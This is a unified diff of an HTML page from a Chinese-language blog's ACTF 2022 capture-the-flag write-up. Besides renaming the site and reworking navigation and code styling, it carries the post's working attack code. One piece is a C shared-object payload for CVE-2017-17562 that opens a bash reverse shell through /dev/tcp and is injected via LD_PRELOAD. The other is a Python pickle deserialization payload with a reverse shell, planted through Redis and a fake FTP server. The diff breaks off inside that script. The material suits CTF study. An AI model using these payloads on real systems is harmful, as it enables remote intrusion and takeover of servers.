@@ -4,14 +4,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ACTF 2022, Jlan&#39;s Little World">
+    <meta name="keywords" content="ACTF 2022, J1an&#39;s Little World">
     <meta name="description" content="ACTF 2022和学长一起熬大夜做不出来题真是太爽🌶️，下次继续
 
 
 gogogo是CVE，好耶
 CVE-2017-17562
 先写弹shell的so文件
-12345678#include &amp;lt;stdlib.h&amp;gt;#includ">
+#include &amp;lt;stdlib.h&gt;
+#include &amp;lt;stdi">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +24,7 @@ CVE-2017-17562
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ACTF 2022 | Jlan&#39;s Little World</title>
+    <title>ACTF 2022 | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -51,8 +52,6 @@ CVE-2017-17562
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -70,7 +69,7 @@ CVE-2017-17562
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -91,55 +90,11 @@ CVE-2017-17562
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -174,7 +129,7 @@ CVE-2017-17562
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -197,55 +152,11 @@ CVE-2017-17562
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -397,6 +308,9 @@ CVE-2017-17562
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -408,7 +322,14 @@ CVE-2017-17562
 <h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><p>是CVE，好耶</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2017-17562/README.zh-cn.md">CVE-2017-17562</a></p>
 <p>先写弹shell的so文件</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">aaanb</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -shared -fPIC ./payload.c -o payload.so</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">aaanb</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -c 'bash -i >&amp; /dev/tcp/IP/端口 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">//gcc -shared -fPIC ./payload.c -o payload.so</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>将生成的so文件作为文件发送，并且在请求头中添加<code>LD_PRELOAD=/proc/self/fd/0</code>，由于题目是公共环境。需要对最后数字进行爆破</p>
 <h2 id="ToLeSion"><a href="#ToLeSion" class="headerlink" title="ToLeSion"></a>ToLeSion</h2><p><del>熬一晚上没做出来的题</del></p>
@@ -421,24 +342,172 @@ CVE-2017-17562
 <li>最后更改sessionID并重新访问网页，服务器取出序列化后内容反序列化，反弹shell</li>
 </ul>
 <p>OK上面的流程都已经懂了，那么我们怎么实现呢，首先是伪造服务器（来自学长的完整脚本）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        cmd = <span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/IP/端口 &lt;&amp;1&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line">pickle_code=pickle.dumps(Test2())</span><br><span class="line"><span class="built_in">print</span>(pickle_code)</span><br><span class="line">length=<span class="built_in">len</span>(pickle_code)</span><br><span class="line">payload=<span class="string">b&quot;\r\nset actfSession:J1an 0 0 &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(pickle_code)).encode()+<span class="string">b&quot;\r\n&quot;</span>+pickle_code+<span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_payload</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = redis.Redis(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;payload len: &#x27;</span>, <span class="built_in">len</span>(payload), file=sys.stderr)</span><br><span class="line">    r.<span class="built_in">set</span>(<span class="string">&#x27;payload&#x27;</span>, payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;设置的sessionid为:&quot;</span>,set_payload(payload))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload长度为:&quot;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTCPHandler</span>(<span class="params">socketserver.StreamRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="number">0</span>,<span class="string">&#x27;[+] connected&#x27;</span>, self.request, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;220 (vsFTPd 3.0.3)\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>,self.data, file=sys.stderr,flush=<span class="literal">True</span>)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;230 Login successful.\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">2</span>,self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;227 yolo\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">3</span>,self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;227 yolo\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">4</span>,self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;257 &quot;/&quot; is the current directory\r\n&#x27;</span>)</span><br><span class="line"><span class="comment"># vps:importlib/a/b</span></span><br><span class="line"><span class="comment">#         self.data = self.rfile.readline().strip().decode()</span></span><br><span class="line"><span class="comment">#         print(5,self.data, file=sys.stderr)</span></span><br><span class="line"><span class="comment">#         self.request.sendall(b&#x27;250 Directory successfully changed.\r\n&#x27;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#         self.data = self.rfile.readline().strip().decode()</span></span><br><span class="line"><span class="comment">#         print(6,self.data, file=sys.stderr)</span></span><br><span class="line"><span class="comment">#         self.request.sendall(b&#x27;250 Directory successfully changed.\r\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">7</span>,self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;227 Entering Passive Mode (127,0,0,1,43,192)\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">8</span>,self.data, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;227 Entering Passive Mode (127,0,0,1,43,192)\r\n&#x27;</span>)</span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">9</span>,self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;200 Switching to Binary mode.\r\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># self.data = self.rfile.readline().strip().decode()</span></span><br><span class="line">        <span class="comment"># # assert &#x27;SIZE refs&#x27; == self.data, self.data</span></span><br><span class="line">        <span class="comment"># self.finish()</span></span><br><span class="line">        <span class="comment"># print(10,self.data, file=sys.stderr)</span></span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;213 7\r\n&#x27;</span>)</span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;125 Data connection already open. Transfer starting.\r\n&#x27;</span>)</span><br><span class="line">        self.data = self.rfile.readline().strip().decode()</span><br><span class="line">        <span class="built_in">print</span>(self.data, file=sys.stderr)</span><br><span class="line">        self.request.sendall(<span class="string">b&#x27;250 Requested file action okay, completed.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;DIE.....&quot;</span>)</span><br><span class="line">        <span class="comment"># exit()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;使用端口:&quot;</span>,sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socketserver.TCPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])), MyTCPHandler) <span class="keyword">as</span> server:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;start...&quot;</span>)</span><br><span class="line">        server.handle_request()</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">&quot;stop&quot;</span>, <span class="string">&quot;w&quot;</span>).write(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;END....&quot;</span>)</span><br><span class="line">        <span class="comment"># exit()</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> socketserver
+<span class="token keyword">import</span> sys
+
+<span class="token keyword">import</span> redis
+<span class="token keyword">class</span> <span class="token class-name">Test2</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd <span class="token operator">=</span> <span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/IP/端口 &lt;&amp;1'"</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+pickle_code<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>Test2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>pickle_code<span class="token punctuation">)</span>
+length<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>pickle_code<span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">b"\r\nset actfSession:J1an 0 0 "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pickle_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b"\r\n"</span><span class="token operator">+</span>pickle_code<span class="token operator">+</span><span class="token string">b"\r\n"</span>
+<span class="token keyword">def</span> <span class="token function">set_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'payload len: '</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'payload'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> payload
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"设置的sessionid为:"</span><span class="token punctuation">,</span>set_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload长度为:"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+
+
+<span class="token keyword">class</span> <span class="token class-name">MyTCPHandler</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>StreamRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'[+] connected'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>request<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'220 (vsFTPd 3.0.3)\r\n'</span><span class="token punctuation">)</span>
+
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">,</span>flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\r\n'</span><span class="token punctuation">)</span>
+
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 yolo\r\n'</span><span class="token punctuation">)</span>
+
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 yolo\r\n'</span><span class="token punctuation">)</span>
+
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'257 "/" is the current directory\r\n'</span><span class="token punctuation">)</span>
+<span class="token comment"># vps:importlib/a/b</span>
+<span class="token comment">#         self.data = self.rfile.readline().strip().decode()</span>
+<span class="token comment">#         print(5,self.data, file=sys.stderr)</span>
+<span class="token comment">#         self.request.sendall(b'250 Directory successfully changed.\r\n')</span>
+<span class="token comment">#</span>
+<span class="token comment">#         self.data = self.rfile.readline().strip().decode()</span>
+<span class="token comment">#         print(6,self.data, file=sys.stderr)</span>
+<span class="token comment">#         self.request.sendall(b'250 Directory successfully changed.\r\n')</span>
+
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n'</span><span class="token punctuation">)</span>
+
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n'</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\r\n'</span><span class="token punctuation">)</span>
+        <span class="token comment"># self.data = self.rfile.readline().strip().decode()</span>
+        <span class="token comment"># # assert 'SIZE refs' == self.data, self.data</span>
+        <span class="token comment"># self.finish()</span>
+        <span class="token comment"># print(10,self.data, file=sys.stderr)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'213 7\r\n'</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'125 Data connection already open. Transfer starting.\r\n'</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'250 Requested file action okay, completed.'</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"DIE....."</span><span class="token punctuation">)</span>
+        <span class="token comment"># exit()</span>
+
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"使用端口:"</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
